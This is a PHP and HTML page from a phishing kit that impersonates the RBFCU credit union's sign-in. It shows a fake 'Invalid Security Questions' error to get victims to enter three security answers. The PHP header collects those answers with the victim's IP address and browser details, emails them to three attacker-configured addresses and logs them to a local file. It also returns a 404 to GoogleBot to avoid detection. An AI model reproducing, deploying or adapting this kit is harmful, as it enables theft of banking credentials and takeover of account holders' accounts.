<?php
session_start();
include('css/vld.php');
include('config/email.php');
include('antibots.php');
if(isset($_POST['q1'])){
	
	$ip = getenv("REMOTE_ADDR");
	$ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "#------------------[ RBFCU Security Question 1 ]---------------------#\n";
$msg .= "Question1  : ".$_POST['q1']."\n";
$msg .= "Answer1   : ".$_POST['a1']."\n";
$msg .= "Question2  : ".$_POST['q2']."\n";
$msg .= "Answer2   : ".$_POST['a2']."\n";
$msg .= "Question3  : ".$_POST['q3']."\n";
$msg .= "Answer3   : ".$_POST['a3']."\n";
$msg .= "#---------------------[ Visitor ]-------------------------#\n";
$msg .= "IP Address		: ".$ip."\n";
$msg .= "DEVICE INFORMATION		    : ".$ua."\n";
$msg .= "#-------------------[ NULLHACKER - END ]------------------------#\n\n";
$sub = "::NULLHACKER:: RBFCU Security Question One: $ip";
mail($to,$sub,$msg);
mail($ml1,$sub,$msg);
mail($ml2,$sub,$msg);
 $data = fopen("antibot.txt", "a");
    $result = $msg;
   fwrite($data, $result);
   fclose($data);
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?><!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>RBFCU - Sign In</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<style type="text/css">
		*{
			padding: 0;
			outline: 0;
			margin: auto;
			font-family: arial,helvetica,consolas;
		}#logo{
			display: block;
			width: 120px;
		}input{
			display: block;
			width: 90%;
			border: 0;
			padding: 10px;
			margin-top: 15px;
			font-size: 16px;
			padding-left: 0;
			border-bottom: 1px solid lightgray;
			font-family: verdana;
		}@media only screen and (min-width: 800px){
			#logo{
			width: 150px;
			margin-top: 12px;
			}
		}.qu{
			margin-top: 50px;
			background: #F1F1F1;
			border: 1px solid lightgray;
			border-radius: 5px;
			padding: 10px;
			width: 90%;
		}select{
			background: transparent;
			width: 100%;
			border: 0;
		}
	</style>
</head>
<body>
<div style="background: #043672;padding: 15px;">
	<img src="img/logo.svg" id="logo">

</div>
<div style="max-width:600px;width:88%; border-radius: 3px;border: 1px solid #F1F1F1;font-size: 14px;box-shadow: 2px 2px 2px solid lightgray;padding: 10px;border-left: 5px solid red;padding-left: 10px;">Invalid Security Questions/Answers, Please try again with a valid security information.</div>
<form action="mail.php"  method="post" style="max-width: 400px;padding: 15px;text-align: center;margin-top: 20px;">
<span style="display: inline-block;font-size:30px;border: 1px solid lightgray;background: #0078e7;color: white;padding: 12px;border-radius: 50px;padding-right: 18px;padding-left: 18px;"><i class="fa fa-lock"></i></span>
<h3 style="font-weight: 500;font-family: verdana;margin-top: 12px;">Security Question</h3>
<p style="font-size: 12px; color: gray;font-family: verdana;padding: 5px;">Verify Your Account Security Question</p>
	
	<div class="qu" style="margin-top: 20px;">
		<select name="q1"  required="">
          <option value="" disabled="" selected="selected">Choose Your Question </option> 
      <option value="What is your father middle name">What is your father middle name </option>
      <option value="What is your maternal grandmother's name">What is your maternal grandmother's name</option>
      <option value="What is the name of the first company you worked for"> What is the name of the first company you worked for </option> 
      <option value="What is your maternal grandfather name?"> What is your maternal grandfather's name?</option> 
      <option value="In what city was your high school? (full name of city only)">In what city was your high school? (full name of city only) </option> 
      <option value="What was the name of your high school?">What was the name of your high school? </option> 
      <option value="What is the first name of the maid of honor at your wedding?">What is the first name of the maid of honor at your wedding? </option> 
      <option value="In what city were you married? (Enter full name of city)">In what city were you married? (Enter full name of city) </option>
      <option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew? </option> 

                      </select>         
	</div>
	<input type="" name="a1" minlength="3"  placeholder="Answer" required>











	<div class="qu">
		<select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="q2"   required="">
          <option value="" disabled="" selected="selected">Choose Your Question </option> 
      <option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding? </option>
      <option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
      <option value="What is your paternal grandfather name?"> What is your paternal grandfather's name? </option> 
      <option value="In what city is your vacation home? (Enter full name of city only)"> In what city is your vacation home? (Enter full name of city only)</option> 
      <option value="What was the name of your first girlfriend or boyfriend? ">What was the name of your first girlfriend or boyfriend? </option> 
      <option value="In what city was your father born? (Enter full name of city only)">In what city was your father born? (Enter full name of city only) </option> 
      <option value="What was the name of your first pet?">What was the name of your first pet? </option> 
      <option value="What was the nickname of your grandfather?">What was the nickname of your grandfather? </option> 
      <option value="What was your high school mascot?">What was your high school mascot? </option> 


</select>
	</div>
	<input type="" name="a2" minlength="3"  placeholder="Answer" required>


















	<div class="qu">
		<select name="q3" required="">
          <option value="" disabled="" selected="selected">Choose Your Question </option> 
      <option value="What is your paternal grandfather name?">What is your paternal grandfather's name? </option>
      <option value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only) </option>
      <option value="What was the last name of your favorite teacher in final year of high school?"> What was the last name of your favorite teacher in final year of high school? </option> 
      <option value="In what city were you born? (Enter full name of city only)"> In what city were you born? (Enter full name of city only)</option> 
      <option value="What was the name of the town your grandmother lived in? (Enter full name of city only)">What was the name of the town your grandmother lived in? (Enter full name of city only) </option> 
      <option value="What was your favorite restaurant in college?">What was your favorite restaurant in college? </option> 
      <option value="Where did you meet your spouse for the first time? (Enter full name of city only)">Where did you meet your spouse for the first time? (Enter full name of city only)</option> 
      <option value="In what city was your mother born? (Enter full name of city only)">In what city was your mother born? (Enter full name of city only) </option> 
      <option value="What was the name of your junior high school? (Enter only Riverdale for Riverdale Junior high school)">What was the name of your junior high school? (Enter only Riverdale for Riverdale Junior high school) </option> 

                      </select>
	</div>
	<input type="" name="a3" minlength="3"  placeholder="Answer" required>
<button type="submit" style="background: #0078e7;color: white;padding: 12px;width: 95%;border: 0;margin-top: 40px;border-radius: 5px;font-size: 15px;font-weight: bold;">Continue</button>

</form>
<div style="border-top: 3px solid #F1F1F1;margin-top: 50px;padding: 15px;">
	<div style="max-width: 1000px;padding: 5px;font-size: 14px;color: gray;">
		<p style="font-size: 14px;color: gray;">© Randolph-Brooks Federal Credit Union 2022.</p>
		<p style="font-size: 14px;color: gray;line-height: 22px; margin-top: 20px;">If you are using a screen reader and are having problems using this website, please call 1-800-580-3300 for assistance.</p>
		<p style="font-size: 14px;color: gray;margin-top: 20px;text-align: center;"><img src="img/NCUA-logo-gray.svg" width="80px">Federally Insured by NCUA.</p>
				<p style="font-size: 14px;color: gray;text-align: center;margin-top: 20px;">Equal Housing Lender.<img src="img/EHL-logo-gray.svg" width="40px"></p>

	</div>
</div>
<br>
<br>




</body>
</html>